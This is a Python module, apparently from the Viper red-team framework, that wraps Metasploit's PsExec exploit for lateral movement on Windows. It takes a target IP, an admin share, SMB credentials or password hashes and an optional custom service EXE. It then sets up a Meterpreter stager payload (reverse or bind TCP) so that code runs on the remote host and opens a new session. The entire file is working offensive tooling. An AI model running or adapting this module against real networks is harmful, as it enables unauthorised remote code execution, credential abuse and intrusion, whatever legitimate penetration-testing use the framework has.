# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "PSEXEC明文/哈希传递"
    DESC_ZH = "模块使用已知的用户名及密码/哈希,通过psexec方式在目标主机执行载荷.\n" \
              "如果没有填写IP地址参数则模块默认测试当前主机.\n" \
              "如使用自定义的EXE,请确认exe为service类型的exe"

    NAME_EN = "PSEXEC lateral movement"
    DESC_EN = "The module uses a username and password/hash to execute the payload on the target host through psexec.\n" \
              "If you use a custom EXE, please confirm that the exe is a service type exe"

    MODULETYPE = TAG2TYPE.Lateral_Movement
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1097"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/eru9rf"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1097/"]
    AUTHOR = ["Viper"]

    REQUIRE_SESSION = False
    OPTIONS = register_options([
        OptionStr(name='RHOST',
                  tag_zh="目标IP", desc_zh="目标的IP地址",
                  tag_en="Target IP", desc_en="IP address of the target"),
        OptionEnum(name='TARGET',
                   tag_zh="执行方式", desc_zh="选择载荷的加载方式",
                   tag_en="Execution way", desc_en="Choose how to load the payload",
                   required=True,
                   default=0,
                   enum_list=[
                       {'tag_zh': '自动选择', 'tag_en': 'Automatic', 'value': 0},
                       {'tag_zh': 'Powershell', 'tag_en': 'PowerShell', 'value': 1},
                       {'tag_zh': '二进制上传', 'tag_en': 'Native upload', 'value': 2},
                       {'tag_zh': 'MOF上传', 'tag_en': 'MOF upload', 'value': 3},
                       {'tag_zh': 'Command', 'tag_en': 'Command', 'value': 4},
                   ],
                   ),

        OptionStr(name='SHARE',
                  tag_zh="共享目录",
                  desc_zh="目标主机的共享目录,可以是ADMIN$或C$等管理员目录或其他可读写的共享目录",
                  tag_en="Shared directory",
                  desc_en="The shared directory of the target host, which can be an administrator directory such as ADMIN$ or C$ or other readable and writable shared directories",
                  default="ADMIN$",
                  ),

        OptionStr(name='SMBDomain',
                  tag_zh="域", desc_zh="目标主机的域 . 表示本地域",
                  tag_en="Domain", desc_en="Domain of the target host"
                  ),
        OptionStr(name='SMBUser',
                  tag_zh="用户名", desc_zh="smb用户名",
                  tag_en="User", desc_en="smb username", ),
        OptionStr(name='SMBPass',
                  tag_zh="密码", desc_zh="smb密码",
                  tag_en="Password", desc_en="smb password", ),
        OptionCredentialEnum(required=False, password_type=['windows', ]),
        OptionHander(required=False),
        OptionFileEnum(required=False, ext=['exe', 'dll']),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "exploit"
        self.mname = "windows/smb/psexec_api"

    def check(self):
        """执行前的检查函数"""
        rhost = self.param('RHOST')
        if rhost is None:
            self.set_msf_option(key='RHOSTS', value=self.host_ipaddress)
        else:
            self.set_msf_option(key='RHOSTS', value=rhost)

        if self.param('SHARE') is not None:
            self.set_msf_option(key='SHARE', value=self.param('SHARE'))

        if self.param('TARGET') is not None:
            self.set_msf_option(key='TARGET', value=self.param('TARGET'))

        flag = self.set_smb_info_by_credential()
        if flag is not True:
            domain = self.param('SMBDomain')
            user = self.param('SMBUser')
            password = self.param('SMBPass')
            if domain is not None and user is not None and password is not None:
                self.set_msf_option(key='SMBDomain', value=domain)
                self.set_msf_option(key='SMBUser', value=user)
                self.set_msf_option(key='SMBPass', value=password)
            else:
                return False, "请选择凭证或手工输入凭证", "Please select the certificate or enter the certificate manually"
        else:
            # 手工输入覆盖凭证输入
            domain = self.param('SMBDomain')
            user = self.param('SMBUser')
            password = self.param('SMBPass')
            if domain is not None and domain != "":
                self.set_msf_option(key='SMBDomain', value=domain)
            if user is not None and user != "":
                self.set_msf_option(key='SMBUser', value=user)
            if password is not None and password != "":
                self.set_msf_option(key='SMBPass', value=password)

        # 自定义exe
        pe_file_path = self.get_fileoption_filepath(msf=True)  # msf=True是为了调试

        if pe_file_path is not None:
            pe_file_path = self.get_fileoption_filepath(msf=True)
            self.set_msf_option(key='TARGET', value=2)
            self.set_msf_option(key='PAYLOAD', value="generic/custom")
            self.set_msf_option(key='PAYLOADFILE', value=pe_file_path)
            self.set_msf_option(key='EXE::Custom', value=pe_file_path)
            self.set_msf_option(key='disablepayloadhandler', value=True)
            return True, None
        else:
            payload = self.get_handler_payload()
            if payload is None:
                return False, "无法解析Handler,请选择正确的监听", "Unable to resolve Handler, please select the correct handler"
            if "meterpreter_reverse" in payload or "meterpreter_bind" in payload:
                return False, "请选择Stager类型的监听(例如/meterpreter/reverse_tcp或/meterpreter/bind_tcp)", "Please select the stager type of handler (e.g. /meterpreter/reverse_tcp or /meterpreter/bind_tcp)"
            flag = self.set_payload_by_handler()
            if flag is not True:
                return False, "无法解析Handler,请选择正确的监听", "Unable to resolve Handler, please select the correct handler"
            return True, None

    def callback(self, status, message, data):
        if status:
            self.log_good("模块执行完成,稍等片刻后查看是否生成新的Session",
                          "The module execution is complete, wait a while to see if a new Session is generated")
        else:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error("无法使用提供的参数连接远程SMB服务.请检查是否添加内网路由或主机是否可以连接",
                           "Unable to connect to the remote SMB service using the provided parameters. Please check whether the intranet route is added or the host can be connected")
            self.log_error(message, message)
